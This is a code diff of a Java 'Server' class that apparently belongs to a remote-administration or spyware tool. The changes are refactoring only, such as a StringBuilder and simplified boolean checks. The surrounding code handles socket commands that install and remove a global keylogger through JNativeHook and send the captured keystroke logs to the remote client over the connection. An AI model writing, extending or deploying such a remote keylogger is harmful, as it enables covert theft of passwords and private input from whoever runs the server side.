@@ -3,7 +3,6 @@ package model;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.*;
-import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
 
 import com.github.kwhat.jnativehook.NativeHookException;
@@ -16,9 +15,8 @@ import javax.imageio.ImageIO;
 public class Server {
     private enum Status {
         STOP,
-        SUSPEND,
         RUNNING,
-    };
+    }
     private ServerSocket serverSock;
     private Socket clientSock;
     private InputStream inputStream;
@@ -181,14 +179,14 @@ public class Server {
         notifyController(action);
         switch(action) {
             case ("Hook"): {
-                if (isHooked == false) {
+                if (!isHooked) {
                     GlobalScreen.addNativeKeyListener(keyLogger);
                     isHooked = true;
                 }
                 break;
             }
             case ("Unhook"): {
-                if (isHooked == true) {
+                if (isHooked) {
                     GlobalScreen.removeNativeKeyListener(keyLogger);
                     keyLogger.clearLogs();
                     isHooked = false;
@@ -196,11 +194,11 @@ public class Server {
                 break;
             }
             case ("Print"): {
-                String out = "";
+                StringBuilder out = new StringBuilder();
                 for (int i = 0; i < keyLogger.logs.size(); i++) {
-                    out += keyLogger.logs.get(i);
+                    out.append(keyLogger.logs.get(i));
                 }
-                byte[] tmp = out.getBytes();
+                byte[] tmp = out.toString().getBytes();
 
                 try {
                     outputStream.write(tmp);
